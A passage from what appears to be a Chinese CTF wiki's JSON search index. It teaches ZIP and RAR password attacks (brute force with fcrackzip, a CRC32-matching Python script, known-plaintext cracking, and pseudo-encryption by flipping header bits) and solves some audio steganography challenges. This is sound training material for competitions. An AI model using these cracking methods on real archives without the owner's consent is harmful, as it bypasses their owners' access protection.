\u76ee\u5f55\u7ed3\u675f\u6807\u8bc6\u5b58\u5728\u4e8e\u6574\u4e2a\u5f52\u6863\u5305\u7684\u7ed3\u5c3e\uff0c\u7528\u4e8e\u6807\u8bb0\u538b\u7f29\u7684\u76ee\u5f55\u6570\u636e\u7684\u7ed3\u675f\u3002\u6bcf\u4e2a\u538b\u7f29\u6587\u4ef6\u5fc5\u987b\u6709\u4e14\u53ea\u6709\u4e00\u4e2aEOCD\u8bb0\u5f55\u3002     \u66f4\u52a0\u8be6\u7ec6\u53c2\u89c1  \u5b98\u65b9\u6587\u6863 \u3002", 
            "title": "\u6587\u4ef6\u7ed3\u6784"
        }, 
        {
            "location": "/misc/archive/zip/#_2", 
            "text": "", 
            "title": "\u4e3b\u8981\u653b\u51fb"
        }, 
        {
            "location": "/misc/archive/zip/#_3", 
            "text": "\u8fd9\u91cc\u4e3b\u8981\u4ecb\u7ecd\u4e24\u6b3e\u7206\u7834\u4f7f\u7528\u7684\u5de5\u5177    Windows\u4e0b\u7684\u795e\u5668  ARCHPR   \u66b4\u529b\u679a\u4e3e\uff0c\u8dd1\u5b57\u5178\uff0c\u660e\u6587\u653b\u51fb\uff0c\u5e94\u6709\u5c3d\u6709\u3002    Linux\u4e0b\u7684\u547d\u4ee4\u884c\u5de5\u5177  fcrackzip  # \uff0db \u6307\u5b9a\u6a21\u5f0f\u4e3a\u66b4\u7834\uff0c-c1\u6307\u5b9a\u5bc6\u7801\u7c7b\u578b\u4e3a\u7eaf\u6570\u5b57\uff0c\u5176\u5b83\u7c7b\u578b\u53ef\u4ee5rtfm,-u\u8fd9\u4e2a\u53c2\u6570\u975e\u5e38\u91cd\u8981\u4e0d\u7136\u4e0d\u663e\u793a\u7834\u89e3\u51fa\u6765\u7684\u5bc6\u7801,-l 5-6\u53ef\u4ee5\u6307\u5b9a\u957f\u5ea6 \nroot@kali:fcrackzip -b -c1 -u test.zip", 
            "title": "\u7206\u7834"
        }, 
        {
            "location": "/misc/archive/zip/#crc32", 
            "text": "", 
            "title": "CRC32"
        }, 
        {
            "location": "/misc/archive/zip/#_4", 
            "text": "CRC \u672c\u8eab\u662f\u300c\u5197\u4f59\u6821\u9a8c\u7801\u300d\u7684\u610f\u601d\uff0cCRC32 \u5219\u8868\u793a\u4f1a\u4ea7\u751f\u4e00\u4e2a 32 bit\uff088 \u4f4d\u5341\u516d\u8fdb\u5236\u6570\uff09\u7684\u6821\u9a8c\u503c\u3002\u7531\u4e8e CRC32 \u4ea7\u751f\u6821\u9a8c\u503c\u65f6\u6e90\u6570\u636e\u5757\u7684\u6bcf\u4e00\u4e2a bit\uff08\u4f4d\uff09\u90fd\u53c2\u4e0e\u4e86\u8ba1\u7b97\uff0c\u6240\u4ee5\u6570\u636e\u5757\u4e2d\u5373\u4f7f\u53ea\u6709\u4e00\u4f4d\u53d1\u751f\u4e86\u53d8\u5316\uff0c\u4e5f\u4f1a\u5f97\u5230\u4e0d\u540c\u7684 CRC32 \u503c\u3002  CRC32 \u6821\u9a8c\u7801\u51fa\u73b0\u5728\u5f88\u591a\u6587\u4ef6\u4e2d\u6bd4\u5982  png  \u6587\u4ef6\uff0c\u540c\u6837  zip  \u4e2d\u4e5f\u6709 CRC32 \u6821\u9a8c\u7801\u3002\u503c\u5f97\u6ce8\u610f\u7684\u662f  zip  \u4e2d\u7684 CRC32 \u662f\u672a\u52a0\u5bc6\u6587\u4ef6\u7684\u6821\u9a8c\u503c\u3002  \u8fd9\u4e5f\u5c31\u5bfc\u81f4\u4e86\u57fa\u4e8e CRC32 \u7684\u653b\u51fb\u624b\u6cd5\u3002   \u6587\u4ef6\u5185\u5185\u5bb9\u5f88\u5c11\uff08\u4e00\u822c\u6bd4\u8d5b\u4e2d\u5927\u591a\u4e3a 4 \u5b57\u8282\u5de6\u53f3\uff09  \u52a0\u5bc6\u7684\u5bc6\u7801\u5f88\u957f   \u6211\u4eec\u4e0d\u53bb\u7206\u7834\u538b\u7f29\u5305\u7684\u5bc6\u7801\uff0c\u800c\u662f\u76f4\u63a5\u53bb\u76f4\u63a5\u7206\u7834\u6e90\u6587\u4ef6\u7684\u5185\u5bb9\uff08\u4e00\u822c\u90fd\u662f\u53ef\u89c1\u7684\u5b57\u7b26\u4e32\uff09\uff0c\u4ece\u800c\u83b7\u53d6\u60f3\u8981\u7684\u4fe1\u606f\u3002  \u6bd4\u5982\u6211\u4eec\u65b0\u5efa\u4e00\u4e2a  flag.txt \uff0c\u5176\u4e2d\u5185\u5bb9\u4e3a  123 \uff0c\u4f7f\u7528\u5bc6\u7801  !QAZXSW@#EDCVFR$  \u53bb\u52a0\u5bc6\u3002   \u800c\u6211\u4eec\u53bb\u8ba1\u7b97\u6587\u4ef6\u7684 CRC32 \u503c\u53d1\u73b0\u548c\u4e0a\u56fe\u4e2d\u7684 CRC32 \u503c\u543b\u5408\u3002  \u6587\u4ef6: flag.txt \n\u5927\u5c0f:  3  \n\u65f6\u95f4: Tue,  29  Aug  2017   10 :38:10 +0800 \nMD5: 202cb962ac59075b964b07152d234b70 \nSHA1: 40bd001563085fc35165329ea1ff5c5ecbdbbeef \nCRC32: 884863D2    Note  \u5728\u7206\u7834\u65f6\u6211\u4eec\u6240\u679a\u4e3e\u7684\u6240\u6709\u53ef\u80fd\u5b57\u7b26\u4e32\u7684CRC32\u503c\u662f\u8981\u4e0e\u538b\u7f29\u6e90\u6587\u4ef6\u6570\u636e\u533a\u4e2d\u7684CRC32\u503c\u6240\u5bf9\u5e94   # -*- coding: utf-8 -*-  import   binascii  import   base64  import   string  import   itertools  import   struct  alph   =   abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=  crcdict   =   {}  print   computing all possible CRCs...  for   x   in   itertools . product ( list ( alph ),   repeat = 4 ): \n     st   =   . join ( x ) \n     testcrc   =   binascii . crc32 ( st )  \n     crcdict [ struct . pack ( i ,   testcrc )]   =   st   print   Done!  f   =   open ( flag.zip )  data   =   f . read ()  f . close ()  crc   =   . join ( data [ 14 : 18 ])  if   crc   in   crcdict : \n     print   crcdict [ crc ]  else : \n     print   FAILED!", 
            "title": "\u539f\u7406"
        }, 
        {
            "location": "/misc/archive/zip/#_5", 
            "text": "Abctf-2016:Zippy  \u6839\u636e\u6bcf\u4e2a\u538b\u7f29\u5305\u5185\u7684\u6587\u4ef6\u5927\u5c0f\u53ef\u4ee5\u63a8\u65ad\u4f7f\u7528  CRC32  \u653b\u51fb\u624b\u6cd5\uff0c\u83b7\u5f97\u6bcf\u4e2a\u538b\u7f29\u5305\u5185\u7684\u5185\u5bb9\u540e\u8fde\u5728\u4e00\u8d77 Base64 \u89e3\u7801\u540e\u65f6\u4e00\u4e2a\u52a0\u5bc6\u7684\u538b\u7f29\u5305\uff0c\u7206\u7834\u83b7\u5f97 flag\u3002", 
            "title": "\u4f8b\u9898"
        }, 
        {
            "location": "/misc/archive/zip/#_6", 
            "text": "", 
            "title": "\u660e\u6587\u653b\u51fb"
        }, 
        {
            "location": "/misc/archive/zip/#_7", 
            "text": "\u4e00\u4e2a\u52a0\u5bc6\u7684\u538b\u7f29\u6587\u4ef6  \u538b\u7f29\u6587\u4ef6\u7684\u538b\u7f29\u5de5\u5177\uff0c\u6bd4\u5982 2345 \u597d\u538b\uff0cWinRAR\uff0c7z\u3002zip \u7248\u672c\u53f7\u7b49\uff0c\u53ef\u4ee5\u901a\u8fc7\u6587\u4ef6\u5c5e\u6027\u4e86\u89e3\u3002\u5982\u679c\u662f Linux \u5e73\u53f0\uff0c\u7528  zipinfo -v  \u53ef\u4ee5\u67e5\u770b\u4e00\u4e2a zip \u5305\u7684\u8be6\u7ec6\u4fe1\u606f\uff0c\u5305\u62ec\u52a0\u5bc6\u7b97\u6cd5\u7b49  \u77e5\u9053\u538b\u7f29\u5305\u91cc\u67d0\u4e2a\u6587\u4ef6\u7684\u90e8\u5206\u8fde\u7eed\u5185\u5bb9\uff08\u81f3\u5c11 12 \u5b57\u8282\uff09   \u5982\u679c\u4f60\u5df2\u7ecf\u77e5\u9053\u52a0\u5bc6\u6587\u4ef6\u7684\u90e8\u5206\u5185\u5bb9\uff0c\u6bd4\u5982\u5728\u67d0\u4e2a\u7f51\u7ad9\u4e0a\u53d1\u73b0\u4e86\u5b83\u7684 readme.txt \u6587\u4ef6\uff0c\u4f60\u5c31\u53ef\u4ee5\u5f00\u59cb\u5c1d\u8bd5\u7834\u89e3\u4e86\u3002  \u9996\u5148\uff0c\u5c06\u8fd9\u4e2a\u660e\u6587\u6587\u4ef6\u6253\u5305\u6210 zip \u5305\uff0c\u6bd4\u5982\u5c06 readme.txt \u6253\u5305\u6210 readme.zip\u3002  \u6253\u5305\u5b8c\u6210\u540e\uff0c\u9700\u8981\u786e\u8ba4\u4e8c\u8005\u91c7\u7528\u7684\u538b\u7f29\u7b97\u6cd5\u76f8\u540c\u3002\u4e00\u4e2a\u7b80\u5355\u7684\u5224\u65ad\u65b9\u6cd5\u662f\u7528 WinRAR \u6253\u5f00\u6587\u4ef6\uff0c\u540c\u4e00\u4e2a\u6587\u4ef6\u538b\u7f29\u540e\u7684\u4f53\u79ef\u662f\u5426\u76f8\u540c\u3002\u5982\u679c\u76f8\u540c\uff0c\u57fa\u672c\u53ef\u4ee5\u8bf4\u660e\u4f60\u7528\u7684\u538b\u7f29\u7b97\u6cd5\u662f\u6b63\u786e\u7684\u3002\u5982\u679c\u4e0d\u540c\uff0c\u5c31\u5c1d\u8bd5\u53e6\u4e00\u79cd\u538b\u7f29\u7b97\u6cd5\u3002", 
            "title": "\u539f\u7406"
        }, 
        {
            "location": "/misc/archive/zip/#_8", 
            "text": "Windows\u4e0b\u7684\u795e\u5668  ARCHPR  Linux\u4e0b\u7684  PKCrack    Note  \u5efa\u8bae\u4f7f\u7528 Windows \u7684 ARCHPR\uff0c\u4e00\u662f\u901f\u5ea6\u8f83\u5feb\uff0c\u4e8c\u662f\u8f83\u7a33\u5b9a\uff08\u4e4b\u524d\u51fa\u9898\u65f6\u9047\u5230\u8fc7\u7528 PKCrack \u7206\u4e0d\u51fa\u6765\u7684\u60c5\u51b5\uff09\u3002", 
            "title": "\u5de5\u5177"
        }, 
        {
            "location": "/misc/archive/zip/#_9", 
            "text": "", 
            "title": "\u4f2a\u52a0\u5bc6"
        }, 
        {
            "location": "/misc/archive/zip/#_10", 
            "text": "\u5728\u4e0a\u6587 ZIP \u683c\u5f0f\u4e2d\u7684  \u6838\u5fc3\u76ee\u5f55\u533a  \u4e2d\uff0c\u6211\u4eec\u5f3a\u8c03\u4e86\u4e00\u4e2a\u53eb\u505a\u901a\u7528\u4f4d\u6807\u8bb0\uff08General purpose bit flag\uff09\u7684 2 \u5b57\u8282\uff0c\u4e0d\u540c\u6bd4\u7279\u4f4d\u6709\u7740\u4e0d\u540c\u7684\u542b\u4e49\u3002  Bit  0 : If set, indicates that the file is encrypted. ( For Method  6  - Imploding ) \nBit  1 : If the compression method used was  type   6 ,\n     Imploding,  then  this bit,  if  set, indicates\n     an 8K sliding dictionary was used.  If clear,\n      then  a 4K sliding dictionary was used.\n...\nBit  6 : Strong encryption.  If this bit is set, you should\n      set  the version needed to extract value to at least\n      50  and you must also  set  bit  0 .  If AES encryption\n     is used, the version needed to extract value must \n     be at least  51 .\n...  \u5728 010Editor \u4e2d\u6211\u4eec\u5c1d\u8bd5\u7740\u5c06\u8fd9 1 \u4f4d\u4fee\u6539  0 --  1 \u3002   \u518d\u6253\u5f00\u6587\u4ef6\u53d1\u73b0\u5df2\u8981\u6c42\u8f93\u5165\u5bc6\u7801\u3002   \u4fee\u6539\u4f2a\u52a0\u5bc6\u7684\u65b9\u6cd5\uff1a   16 \u8fdb\u5236\u4e0b\u4fee\u6539\u901a\u7528\u4f4d\u6807\u8bb0  binwalk -e  \u65e0\u89c6\u4f2a\u52a0\u5bc6  \u5728 Mac OS \u53ca\u90e8\u5206 Linux\uff08\u5982 Kali\uff09\u7cfb\u7edf\u4e2d\uff0c\u53ef\u4ee5\u76f4\u63a5\u6253\u5f00\u4f2a\u52a0\u5bc6\u7684 ZIP \u538b\u7f29\u5305  \u68c0\u6d4b\u4f2a\u52a0\u5bc6\u7684\u5c0f\u5de5\u5177  ZipCenOp.jar  \u6709\u65f6\u5019\u7528  WinRar  \u7684\u4fee\u590d\u529f\u80fd\uff08\u6b64\u65b9\u6cd5\u6709\u65f6\u6709\u5947\u6548\uff0c\u4e0d\u4ec5\u9488\u5bf9\u4f2a\u52a0\u5bc6\uff09", 
            "title": "\u539f\u7406"
        }, 
        {
            "location": "/misc/archive/zip/#_11", 
            "text": "SSCTF-2017:\u6211\u4eec\u7684\u79d8\u5bc6\u662f\u7eff\u8272\u7684  WP:  http://bobao.360.cn/ctf/detail/197.html   \u6211\u4eec\u5728\u5f97\u5230\u4e24\u4e2a  readme.txt \uff0c\u4e14\u4e00\u4e2a\u52a0\u5bc6\uff0c\u4e00\u4e2a\u5df2\u77e5\uff0c\u5f88\u5bb9\u6613\u60f3\u5230\u660e\u6587\u653b\u51fb\u7684\u624b\u6cd5\u3002  \u6ce8\u610f\u5728\u7528\u660e\u6587\u653b\u51fb\u65f6\u7684\u64cd\u4f5c\u3002   \u5f97\u5230\u5bc6\u7801  Y29mZmVl  \u540e\uff0c\u89e3\u538b\u7f29\u6587\u4ef6\uff0c\u5f97\u5230\u53e6\u4e00\u4e2a\u538b\u7f29\u5305\u3002  \u89c2\u5bdf\u901a\u7528\u4f4d\u6807\u8bb0\u4f4d\uff0c\u731c\u6d4b\u4f2a\u52a0\u5bc6\uff0c\u4fee\u6539\u540e\u89e3\u538b\u5f97\u5230 flag\u3002  \u8fd9\u4e00\u9898\uff0c\u57fa\u672c\u6db5\u76d6\u4e86\u6bd4\u8d5b\u4e2d ZIP \u7684\u5e38\u89c1\u8003\u5bdf\u624b\u6cd5\uff0c\u7206\u7834\uff0c\u4f2a\u52a0\u5bc6\uff0c\u660e\u6587\u653b\u51fb\u7b49\uff0c\u90fd\u5728\u672c\u9898\u4e2d\u51fa\u73b0\u3002", 
            "title": "\u4f8b\u9898"
        }, 
        {
            "location": "/misc/archive/rar/", 
            "text": "\u6587\u4ef6\u683c\u5f0f\n\n\nRAR \u6587\u4ef6\u4e3b\u8981\u7531\u6807\u8bb0\u5757\uff0c\u538b\u7f29\u6587\u4ef6\u5934\u5757\uff0c\u6587\u4ef6\u5934\u5757\uff0c\u7ed3\u5c3e\u5757\u7ec4\u6210\u3002\n\n\n\u5176\u6bcf\u4e00\u5757\u5927\u81f4\u5206\u4e3a\u4ee5\u4e0b\u51e0\u4e2a\u5b57\u6bb5\uff1a\n\n\n\n\n\n\n\n\n\u540d\u79f0\n\n\n\u5927\u5c0f\n\n\n\u63cf\u8ff0\n\n\n\n\n\n\n\n\n\n\nHEAD_CRC\n\n\n2\n\n\n\u5168\u90e8\u5757\u6216\u5757\u90e8\u5206\u7684CRC\n\n\n\n\n\n\nHEAD_TYPE\n\n\n1\n\n\n\u5757\u7c7b\u578b\n\n\n\n\n\n\nHEAD_FLAGS\n\n\n2\n\n\n\u963b\u6b62\u6807\u5fd7\n\n\n\n\n\n\nHEAD_SIZE\n\n\n2\n\n\n\u5757\u5927\u5c0f\n\n\n\n\n\n\nADD_SIZE\n\n\n4\n\n\n\u53ef\u9009\u5b57\u6bb5 - \u6dfb\u52a0\u5757\u5927\u5c0f\n\n\n\n\n\n\n\n\nRar\u538b\u7f29\u5305\u7684\u6587\u4ef6\u5934\u4e3a \n0x 52 61 72 21 1A 07 00\n\u3002\n\n\n\u7d27\u8ddf\u7740\u6587\u4ef6\u5934\uff080x526172211A0700\uff09\u7684\u662f\u6807\u8bb0\u5757\uff08MARK_HEAD\uff09\uff0c\u5176\u540e\u8fd8\u6709\u6587\u4ef6\u5934\uff08File Header\uff09\u3002\n\n\n\n\n\n\n\n\n\u540d\u79f0\n\n\n\u5927\u5c0f\n\n\n\u63cf\u8ff0\n\n\n\n\n\n\n\n\n\n\nHEAD_CRC\n\n\n2\n\n\nCRC of fields from HEAD_TYPE to FILEATTR and file name\n\n\n\n\n\n\nHEAD_TYPE\n\n\n1\n\n\nHeader Type: 0x74\n\n\n\n\n\n\nHEAD_FLAGS\n\n\n2\n\n\nBit Flags (Please see \u2018Bit Flags for File in Archive\u2019 table for all possibilities)\uff08\u4f2a\u52a0\u5bc6\uff09\n\n\n\n\n\n\nHEAD_SIZE\n\n\n2\n\n\nFile header full size including file name and comments\n\n\n\n\n\n\nPACK_SIZE\n\n\n4\n\n\nCompressed file size\n\n\n\n\n\n\nUNP_SIZE\n\n\n4\n\n\nUncompressed file size\n\n\n\n\n\n\nHOST_OS\n\n\n1\n\n\nOperating system used for archiving (See the \u2018Operating System Indicators\u2019 table for the flags used)\n\n\n\n\n\n\nFILE_CRC\n\n\n4\n\n\nFile CRC\n\n\n\n\n\n\nFTIME\n\n\n4\n\n\nDate and time in standard MS DOS format\n\n\n\n\n\n\nUNP_VER\n\n\n1\n\n\nRAR version needed to extract file (Version number is encoded as 10 * Major version + minor version.)\n\n\n\n\n\n\nMETHOD\n\n\n1\n\n\nPacking method (Please see \u2018Packing Method\u2019 table for all possibilities\n\n\n\n\n\n\nNAME_SIZE\n\n\n2\n\n\nFile name size\n\n\n\n\n\n\nATTR\n\n\n4\n\n\nFile attributes\n\n\n\n\n\n\nHIGH_PACK_SIZ\n\n\n4\n\n\nHigh 4 bytes of 64-bit value of compressed file size. Optional value, presents only if bit 0x100 in HEAD_FLAGS is set.\n\n\n\n\n\n\nHIGH_UNP_SIZE\n\n\n4\n\n\nHigh 4 bytes of 64-bit value of uncompressed file size. Optional value, presents only if bit 0x100 in HEAD_FLAGS is set.\n\n\n\n\n\n\nFILE_NAME\n\n\nNAME_SIZE bytes\n\n\nFile name - string of NAME_SIZE bytes size\n\n\n\n\n\n\nSALT\n\n\n8\n\n\npresent if (HEAD_FLAGS \n 0x400) != 0\n\n\n\n\n\n\nEXT_TIME\n\n\nvariable size\n\n\npresent if (HEAD_FLAGS \n 0x1000) != 0\n\n\n\n\n\n\n\n\n\u6bcf\u4e2a RAR \u6587\u4ef6\u7684\u7ed3\u5c3e\u5feb\uff08Terminator\uff09\u90fd\u662f\u56fa\u5b9a\u7684\u3002\n\n\n\n\n\n\n\n\nField Name\n\n\nSize (bytes)\n\n\nPossibilities\n\n\n\n\n\n\n\n\n\n\nHEAD_CRC\n\n\n2\n\n\nAlways 0x3DC4\n\n\n\n\n\n\nHEAD_TYPE\n\n\n1\n\n\nHeader type: 0x7b\n\n\n\n\n\n\nHEAD_FLAGS\n\n\n2\n\n\nAlways 0x4000\n\n\n\n\n\n\nHEAD_SIZE\n\n\n2\n\n\nBlock size = 0x0007\n\n\n\n\n\n\n\n\n\u66f4\u591a\u8be6\u89c1 \nhttp://www.forensicswiki.org/wiki/RAR\n\n\n\u4e3b\u8981\u653b\u51fb\n\n\n\u7206\u7834\n\n\n\n\nLinux\u4e0b\u7684 \nRarCrack\n\n\n\n\n\u4f2a\u52a0\u5bc6\n\n\nRAR \u6587\u4ef6\u7684\u4f2a\u52a0\u5bc6\u5728\u6587\u4ef6\u5934\u4e2d\u7684\u4f4d\u6807\u8bb0\u5b57\u6bb5\u4e0a\uff0c\u7528 010 Editor \u53ef\u4ee5\u5f88\u6e05\u695a\u7684\u770b\u89c1\u8fd9\u4e00\u4f4d\uff0c\u4fee\u6539\u8fd9\u4e00\u4f4d\u53ef\u4ee5\u9020\u6210\u4f2a\u52a0\u5bc6\u3002\n\n\n\n\n\u5176\u4f59\u660e\u6587\u653b\u51fb\u7b49\u624b\u6cd5\u4f9d\u65e7\u540c ZIP \u4e2d\u4ecb\u7ecd\u7684\u4e00\u6837\u3002", 
            "title": "RAR \u683c\u5f0f"
        }, 
        {
            "location": "/misc/archive/rar/#_1", 
            "text": "RAR \u6587\u4ef6\u4e3b\u8981\u7531\u6807\u8bb0\u5757\uff0c\u538b\u7f29\u6587\u4ef6\u5934\u5757\uff0c\u6587\u4ef6\u5934\u5757\uff0c\u7ed3\u5c3e\u5757\u7ec4\u6210\u3002  \u5176\u6bcf\u4e00\u5757\u5927\u81f4\u5206\u4e3a\u4ee5\u4e0b\u51e0\u4e2a\u5b57\u6bb5\uff1a     \u540d\u79f0  \u5927\u5c0f  \u63cf\u8ff0      HEAD_CRC  2  \u5168\u90e8\u5757\u6216\u5757\u90e8\u5206\u7684CRC    HEAD_TYPE  1  \u5757\u7c7b\u578b    HEAD_FLAGS  2  \u963b\u6b62\u6807\u5fd7    HEAD_SIZE  2  \u5757\u5927\u5c0f    ADD_SIZE  4  \u53ef\u9009\u5b57\u6bb5 - \u6dfb\u52a0\u5757\u5927\u5c0f     Rar\u538b\u7f29\u5305\u7684\u6587\u4ef6\u5934\u4e3a  0x 52 61 72 21 1A 07 00 \u3002  \u7d27\u8ddf\u7740\u6587\u4ef6\u5934\uff080x526172211A0700\uff09\u7684\u662f\u6807\u8bb0\u5757\uff08MARK_HEAD\uff09\uff0c\u5176\u540e\u8fd8\u6709\u6587\u4ef6\u5934\uff08File Header\uff09\u3002     \u540d\u79f0  \u5927\u5c0f  \u63cf\u8ff0      HEAD_CRC  2  CRC of fields from HEAD_TYPE to FILEATTR and file name    HEAD_TYPE  1  Header Type: 0x74    HEAD_FLAGS  2  Bit Flags (Please see \u2018Bit Flags for File in Archive\u2019 table for all possibilities)\uff08\u4f2a\u52a0\u5bc6\uff09    HEAD_SIZE  2  File header full size including file name and comments    PACK_SIZE  4  Compressed file size    UNP_SIZE  4  Uncompressed file size    HOST_OS  1  Operating system used for archiving (See the \u2018Operating System Indicators\u2019 table for the flags used)    FILE_CRC  4  File CRC    FTIME  4  Date and time in standard MS DOS format    UNP_VER  1  RAR version needed to extract file (Version number is encoded as 10 * Major version + minor version.)    METHOD  1  Packing method (Please see \u2018Packing Method\u2019 table for all possibilities    NAME_SIZE  2  File name size    ATTR  4  File attributes    HIGH_PACK_SIZ  4  High 4 bytes of 64-bit value of compressed file size. Optional value, presents only if bit 0x100 in HEAD_FLAGS is set.    HIGH_UNP_SIZE  4  High 4 bytes of 64-bit value of uncompressed file size. Optional value, presents only if bit 0x100 in HEAD_FLAGS is set.    FILE_NAME  NAME_SIZE bytes  File name - string of NAME_SIZE bytes size    SALT  8  present if (HEAD_FLAGS   0x400) != 0    EXT_TIME  variable size  present if (HEAD_FLAGS   0x1000) != 0     \u6bcf\u4e2a RAR \u6587\u4ef6\u7684\u7ed3\u5c3e\u5feb\uff08Terminator\uff09\u90fd\u662f\u56fa\u5b9a\u7684\u3002     Field Name  Size (bytes)  Possibilities      HEAD_CRC  2  Always 0x3DC4    HEAD_TYPE  1  Header type: 0x7b    HEAD_FLAGS  2  Always 0x4000    HEAD_SIZE  2  Block size = 0x0007     \u66f4\u591a\u8be6\u89c1  http://www.forensicswiki.org/wiki/RAR", 
            "title": "\u6587\u4ef6\u683c\u5f0f"
        }, 
        {
            "location": "/misc/archive/rar/#_2", 
            "text": "", 
            "title": "\u4e3b\u8981\u653b\u51fb"
        }, 
        {
            "location": "/misc/archive/rar/#_3", 
            "text": "Linux\u4e0b\u7684  RarCrack", 
            "title": "\u7206\u7834"
        }, 
        {
            "location": "/misc/archive/rar/#_4", 
            "text": "RAR \u6587\u4ef6\u7684\u4f2a\u52a0\u5bc6\u5728\u6587\u4ef6\u5934\u4e2d\u7684\u4f4d\u6807\u8bb0\u5b57\u6bb5\u4e0a\uff0c\u7528 010 Editor \u53ef\u4ee5\u5f88\u6e05\u695a\u7684\u770b\u89c1\u8fd9\u4e00\u4f4d\uff0c\u4fee\u6539\u8fd9\u4e00\u4f4d\u53ef\u4ee5\u9020\u6210\u4f2a\u52a0\u5bc6\u3002   \u5176\u4f59\u660e\u6587\u653b\u51fb\u7b49\u624b\u6cd5\u4f9d\u65e7\u540c ZIP \u4e2d\u4ecb\u7ecd\u7684\u4e00\u6837\u3002", 
            "title": "\u4f2a\u52a0\u5bc6"
        }, 
        {
            "location": "/misc/audio/introduction/", 
            "text": "\u4e0e\u97f3\u9891\u76f8\u5173\u7684 CTF \u9898\u76ee\u4e3b\u8981\u4f7f\u7528\u4e86\u9690\u5199\u7684\u7b56\u7565\uff0c\u4e3b\u8981\u5206\u4e3a MP3 \u9690\u5199\uff0cLSB \u9690\u5199\uff0c\u6ce2\u5f62\u9690\u5199\uff0c\u9891\u8c31\u9690\u5199\u7b49\u7b49\u3002\n\n\n\u5e38\u89c1\u624b\u6bb5\n\n\n\u901a\u8fc7 \nbinwalk\n \u4ee5\u53ca \nstrings\n \u53ef\u4ee5\u53d1\u73b0\u7684\u4fe1\u606f\u4e0d\u518d\u8be6\u8ff0\u3002\n\n\nMP3 \u9690\u5199\n\n\n\u539f\u7406\n\n\nMP3\u9690\u5199\u4e3b\u8981\u662f\u4f7f\u7528 \nMp3Stego\n \u5de5\u5177\u8fdb\u884c\u9690\u5199\uff0c\u5176\u57fa\u672c\u4ecb\u7ecd\u53ca\u4f7f\u7528\u65b9\u6cd5\u5982\u4e0b\n\n\n\n\nMP3Stego will hide information in MP3 files during the compression process. The data is first compressed, encrypted and then hidden in the MP3 bit stream.\n\n\n\n\nencode -E hidden_text.txt -P pass svega.wav svega_stego.mp3\ndecode -X -P pass svega_stego.mp3\n\n\n\n\n\u4f8b\u9898\n\n\n\n\nISCC-2016: Music Never Sleep\n\n\n\n\n\u521d\u6b65\u89c2\u5bdf\u540e\uff0c\u7531 \nstrings\n \u65e0\u53d1\u73b0\uff0c\u542c\u97f3\u9891\u65e0\u5f02\u5e38\u731c\u6d4b\u4f7f\u7528\u9690\u5199\u8f6f\u4ef6\u9690\u85cf\u6570\u636e\u3002\n\n\n\n\n\u5f97\u5230\u5bc6\u7801\u540e\u4f7f\u7528 \nMp3Stego\n \u89e3\u5bc6\u3002\n\n\ndecode.exe -X ISCC2016.mp3 -P bfsiscc2016\n\n\n\n\n\u5f97\u5230\u6587\u4ef6 \niscc2016.mp3.txt\n:\n\nFlag is SkYzWEk0M1JOWlNHWTJTRktKUkdJTVpXRzVSV0U2REdHTVpHT1pZPQ== ???\n\n\n\nBase64 \n Base32 \u540e\u5f97\u5230 flag\u3002\n\n\n\u6ce2\u5f62\n\n\n\u539f\u7406\n\n\n\u901a\u5e38\u6765\u8bf4\uff0c\u6ce2\u5f62\u65b9\u5411\u7684\u9898\uff0c\u5728\u89c2\u5bdf\u5230\u5f02\u5e38\u540e\uff0c\u4f7f\u7528\u76f8\u5173\u8f6f\u4ef6\uff08Audacity, Adobe Audition \u7b49\uff09\u89c2\u5bdf\u6ce2\u5f62\u89c4\u5f8b\uff0c\u5c06\u6ce2\u5f62\u8fdb\u4e00\u6b65\u8f6c\u5316\u4e3a 01 \u5b57\u7b26\u4e32\u7b49\uff0c\u4ece\u800c\u63d0\u53d6\u8f6c\u5316\u51fa\u6700\u7ec8\u7684 flag\u3002\n\n\n\u4f8b\u9898\n\n\n\n\nISCC-2017: Misc-04\n\n\n\n\n\u5176\u5b9e\u8fd9\u9898\u9690\u85cf\u7684\u4fe1\u606f\u5728\u6700\u5f00\u59cb\u7684\u4e00\u6bb5\u97f3\u9891\u5185\uff0c\u4e0d\u7ec6\u5fc3\u542c\u53ef\u80fd\u4f1a\u8bef\u8ba4\u4e3a\u662f\u9690\u5199\u8f6f\u4ef6\u3002\n\n\n\n\n\u4ee5\u9ad8\u4e3a 1 \u4f4e\u4e3a 0\uff0c\u8f6c\u6362\u5f97\u5230 \n01\n \u5b57\u7b26\u4e32\u3002\n\n\n110011011011001100001110011111110111010111011000010101110101010110011011101011101110110111011110011111101\n\n\n\n\n\u8f6c\u4e3a ASCII\uff0c\u6469\u65af\u5bc6\u7801\u89e3\u5bc6\uff0c\u5f97\u5230 flag\u3002\n\n\n\n\nNote\n\n\n\u4e00\u4e9b\u8f83\u590d\u6742\u7684\u53ef\u80fd\u4f1a\u5148\u5bf9\u97f3\u9891\u8fdb\u884c\u4e00\u7cfb\u5217\u7684\u5904\u7406\uff0c\u5982\u6ee4\u6ce2\u7b49\u3002\u4f8b\u5982 \nJarvisOJ - \u4e0a\u5e1d\u4e4b\u97f3 Writeup\n\n\n\n\n\u9891\u8c31\n\n\n\u539f\u7406\n\n\n\u97f3\u9891\u4e2d\u7684\u9891\u8c31\u9690\u5199\u662f\u5c06\u5b57\u7b26\u4e32\u9690\u85cf\u5728\u9891\u8c31\u4e2d\uff0c\u6b64\u7c7b\u97f3\u9891\u901a\u5e38\u4f1a\u6709\u4e00\u4e2a\u8f83\u660e\u663e\u7684\u7279\u5f81\uff0c\u542c\u8d77\u6765\u662f\u4e00\u6bb5\u6742\u97f3\u6216\u8005\u6bd4\u8f83\u523a\u8033\u3002\n\n\n\u4f8b\u9898\n\n\n\n\nSu-ctf-quals-2014:hear_with_your_eyes\n\n\n\n\n\n\nLSB\u97f3\u9891\u9690\u5199\n\n\n\u539f\u7406\n\n\n\u7c7b\u4f3c\u4e8e\u56fe\u7247\u9690\u5199\u4e2d\u7684 LSB \u9690\u5199\uff0c\u97f3\u9891\u4e2d\u4e5f\u6709\u5bf9\u5e94\u7684 LSB \u9690\u5199\u3002\u4e3b\u8981\u53ef\u4ee5\u4f7f\u7528 \nSilenteye\n \u5de5\u5177\uff0c\u5176\u4ecb\u7ecd\u5982\u4e0b\uff1a\n\n\n\n\nSilentEye is a cross-platform application design for an easy use of steganography, in this case hiding messages into pictures or sounds. It provides a pretty nice interface and an easy integration of new steganography algorithm and cryptography process by using a plug-ins system.\n\n\n\n\n\u4f8b\u9898\n\n\n\n\n2015 \u5e7f\u4e1c\u7701\u5f3a\u7f51\u676f - Little Apple\n\n\n\n\n\u76f4\u63a5\u4f7f\u7528 